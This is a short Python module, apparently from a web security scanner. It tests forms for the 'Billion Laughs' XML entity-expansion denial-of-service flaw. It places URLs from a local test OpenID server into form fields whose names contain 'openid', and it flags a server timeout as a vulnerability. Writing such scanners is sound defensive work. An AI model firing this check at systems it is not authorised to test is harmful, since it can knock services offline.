from ..utils import attack
from ..openID_test_server import Create_server
import socket


def search(page):
    for form in page.get_forms():
        yield (form,)


@attack(search)
def billion_laughs(client, log, form):
    def attack(attack_url):
        parameters = dict(form.get_parameters())
        for key in parameters:
            if 'openid' in key:
                parameters[key] = attack_url
                
        try:
            if '' in parameters:
                del parameters['']     
            form.send(client, parameters, timeout=1)
        except socket.timeout:
            return True
        return False

    with Create_server(client.config) as openid_server:

        if attack(openid_server.benign_url):
            log('warn', openid_server.benign_url, "Billion Laughs",
                "Test did not work!")
            return

        for evil_url in openid_server.evil_urls:
            if attack(evil_url):
                log('vuln', evil_url, "Billion Laughs")
